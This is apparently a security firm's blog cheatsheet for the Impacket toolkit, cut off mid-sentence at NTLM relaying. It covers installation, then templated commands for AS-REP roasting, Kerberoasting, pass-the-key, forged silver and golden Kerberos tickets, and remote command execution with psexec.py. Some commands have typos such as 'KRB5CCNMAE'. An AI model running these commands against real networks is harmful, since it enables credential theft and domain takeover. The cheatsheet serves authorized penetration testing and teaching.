---
title: Impacket Cheatsheet
url: https://www.blackhillsinfosec.com/impacket-cheatsheet/
source: Black Hills Information Security, Inc.
date: 2025-08-07
fetch_date: 2025-10-07T00:48:18.266839
---

# Impacket Cheatsheet

[![Black Hills Information Security, Inc.](https://www.blackhillsinfosec.com/wp-content/uploads/2025/03/BHIS_TEXT_BHIS.png)](https://www.blackhillsinfosec.com "Black Hills Information Security, Inc.")

[RSS](https://www.blackhillsinfosec.com/feed/)

* [All Services](https://www.blackhillsinfosec.com/services/)
  + [Complete Service Guide](https://www.blackhillsinfosec.com/services/complete-service-guide/)
  + [Active SOC](https://www.blackhillsinfosec.com/services/active-soc/)
  + [AI Security Assessments](https://www.blackhillsinfosec.com/services/ai-security-assessments/)
  + [Blockchain Security](https://www.blackhillsinfosec.com/services/blockchain-security/)
  + [Blue Team Services](https://www.blackhillsinfosec.com/services/blue-team-services/)
  + [Continuous Penetration Testing](https://www.blackhillsinfosec.com/services/antisoc/)
  + [High-Profile Risk Assessments](https://www.blackhillsinfosec.com/services/high-profile-risk-assessments/)
  + [Incident Response](https://www.blackhillsinfosec.com/services/incident-response/)
  + [Penetration Testing](https://www.blackhillsinfosec.com/services/)
* [Contact Us](https://www.blackhillsinfosec.com/contact-us/)
  + [Contact Us](https://www.blackhillsinfosec.com/contact-us/)
  + [Email Sign-Up](https://mailchi.mp/blackhillsinfosec.com/bhis-sign-up)
* [About Us](https://www.blackhillsinfosec.com/who-we-are/)
  + [Security Consultants](https://www.blackhillsinfosec.com/about/security-analysts/)
  + [Admin](https://www.blackhillsinfosec.com/about/admin-staff/)
  + [SOC Team](https://www.blackhillsinfosec.com/about/soc-team/)
  + [BHIS Family of Companies](https://www.blackhillsinfosec.com/bhis-tribe-of-companies/)
* [Free Resources](https://www.blackhillsinfosec.com/free-cybersecurity-tools/)
  + [Blogs](https://www.blackhillsinfosec.com/blog/)
  + [Free Cybersecurity Tools](https://www.blackhillsinfosec.com/free-cybersecurity-tools/)
  + [Free Cybersecurity Webcasts](https://www.blackhillsinfosec.com/free_cybersecurity_webcasts/)
  + [Podcasts](https://podcasts.apple.com/us/podcast/black-hills-information-security/id1410835265)
  + [RITA](https://www.activecountermeasures.com/free-tools/rita/)
* [Training](https://www.blackhillsinfosec.com/bhis-and-antisyphon-training/)
  + [BHIS & Antisyphon Training](https://www.blackhillsinfosec.com/bhis-and-antisyphon-training/)
  + [WWHF Conference](https://wildwesthackinfest.com)
* [Online Community](https://blackhillsinfosec.com/community)
  + [Discord](https://discord.gg/BHIS)
  + [LinkedIn](https://www.linkedin.com/company/black-hills-information-security/)
  + [YouTube](https://www.youtube.com/c/BlackHillsInformationSecurity/videos)
  + [Bluesky](https://bsky.app/profile/bhinfosecurity.bsky.social)
  + [Twitter/X](https://twitter.com/BHinfoSecurity)
  + [Upcoming Events](https://blackhillsinfosec.com/events)
* [Fun Stuff](https://spearphish-general-store.myshopify.com/)
  + [Backdoors & Breaches](https://www.blackhillsinfosec.com/tools/backdoorsandbreaches/)
  + [Merch, Zines & More](https://spearphish-general-store.myshopify.com/)
  + [PROMPT# Zine](https://www.blackhillsinfosec.com/prompt-zine/)
  + [REKCAH](https://www.blackhillsinfosec.com/rekcah/)
  + [Books](https://www.blackhillsinfosec.com/tools/books/)

6
Aug
2025

[Ashley Knowles](https://www.blackhillsinfosec.com/category/author/ashley-knowles/), [Informational](https://www.blackhillsinfosec.com/category/informational/), [InfoSec 101](https://www.blackhillsinfosec.com/category/infosec-101/), [Red Team Tools](https://www.blackhillsinfosec.com/category/red-team/tool-red-team/)
[Cheatsheet](https://www.blackhillsinfosec.com/tag/cheatsheet/), [Impacket](https://www.blackhillsinfosec.com/tag/impacket/), [Infosec for Beginners](https://www.blackhillsinfosec.com/tag/infosec-for-beginners/), [InfoSec Survival Guide](https://www.blackhillsinfosec.com/tag/infosec-survival-guide/)

# [Impacket Cheatsheet](https://www.blackhillsinfosec.com/impacket-cheatsheet/)

Collaborated on by [Ashley Knowles](https://www.blackhillsinfosec.com/team/ashley-knowles/) & [Eric Harashevsky](https://www.linkedin.com/in/eric-harashevsky) || Reviewed by: [Matthew Eidelberg](https://www.linkedin.com/in/matthew-eidelberg/)

![](https://www.blackhillsinfosec.com/wp-content/uploads/2025/08/BLOG_cheatsheet_.png)

**This blog is part of **Offensive Tooling Cheatsheets: An Infosec Survival Guide Resource**. You can learn more and find all of the cheatsheets HERE:** **<https://www.blackhillsinfosec.com/offensive-tooling-cheatsheets/>**

**Impacket Cheatsheet**: [PRINT-FRIENDLY PDF](https://www.blackhillsinfosec.com/wp-content/uploads/2025/08/CheetSheet_Impacket-1.pdf)

Find the tool here: <https://github.com/fortra/impacket>

---

Impacket is an extremely useful tool for post exploitation. It is a collection of Python scripts that provides low-level programmatic access to the packets and for some protocols, such as DCOM, Kerberos, SMB1, and MSRPC, the protocol implementation itself.

Threat actors use a socks proxy, which forwards network traffic from the client to the destination server, to run the tool which adds an additional layer of stealth.

Typically, Impacket is installed by default in Kali. To install on Windows or other Linux operating systems, it is recommended to use pip or docker.

**Pip Installation:**

```
python3 -m pipx install impacket
```

**Docker Installation:**

```
docker build -t "impacket:latest" . docker run -it --rm "impacket:latest"
```

*This author always recommends utilizing Python virtual environments with pip installations, as sometimes things can get wonky when installing multiple tools.*

**Python Virtual Environment Creation:**

```
python3 -m venv <environment_name>
```

**Activate Virtual Environment:**

```
source <environment_name>/bin/activate
```

## **Scripts and Example Usage**

You’ll find the various scripts, attack techniques, and example invocations discussed at a very high level.

### **ASREP-Roast**

GetNPUsers.py

Retrieves kerberoast tickets for users that do not require pre-authentication. The specific attack is called AS-REP Roast.

Check ASREP-Roast for all domain users:

```
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <hashcat | john> - outputfile <output_file_name>
```

Check ASREP-Roast for a list of users:

```
python GetNPUsers.py <domain_name>/ -usersfiles <user_file> -format <hashcat | john> - outputfile <output_file_name>
```

### **Kerberoasting**

GetUserSPNs.py

Conducts kerberoasting, where service principal names are queried and extracted along with their NTLM hashes.

```
python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_file_name>
```

### **Overpass The Hash / Pass The Key (PTK)**

Request the TGT with hash:

```
python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
```

Request the TGT with password:

```
python getTGT.py <domain_name>/<user_name>:<password>
```

Set the TGT for Impacket use:

```
Export KRB5CCNAME=<TGT_ccache_filename>
```

Execute remote commands with any of the following using the TGT. The following command can be used with psexec.py, smbexec.py, or wmiexec.py.

```
python psexec.py <domain_name>/<user_name>@<remote_host> -k -no-pass
```

## Silver / Golden Ticket Usage

To generate the TGS with NTLM:

```
python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <username>
```

To generate the TGT with NTLM:

```
python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <username>
```

Set the ticket for Impacket use:

```
Export KRB5CCNMAE=<ccache_file_name>
```

Execute remote commands with any of the following using the TGT. The following command can be used with psexec.py, smbexec.py, or wmiexec.py:

```
python psexec.py <domain_name>/<user_name>@<remote_host> -k -no-pass
```

### **NTLMRelay from Responder to Targets**

NTLMRelayx is used to relay intercepted...